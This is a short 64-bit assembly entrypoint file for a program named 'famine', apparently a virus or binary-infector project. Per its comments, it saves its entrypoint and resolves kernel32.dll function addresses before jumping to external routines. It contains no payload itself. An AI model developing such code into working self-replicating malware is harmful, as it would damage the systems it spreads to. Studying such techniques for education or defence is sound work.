[BITS 64]

; [ Famine entrypoint ]
; This is the entrypoint of famine.
; - We save the entrypoint of famine
; - We get kernel32.dll base address
; - We resolve the addresses of the functions we need from kernel32.dll


section .text
	global start

	extern _famine
	extern _init_kernel32_address_table


start:
    call _init_kernel32_address_table
	jmp _famine
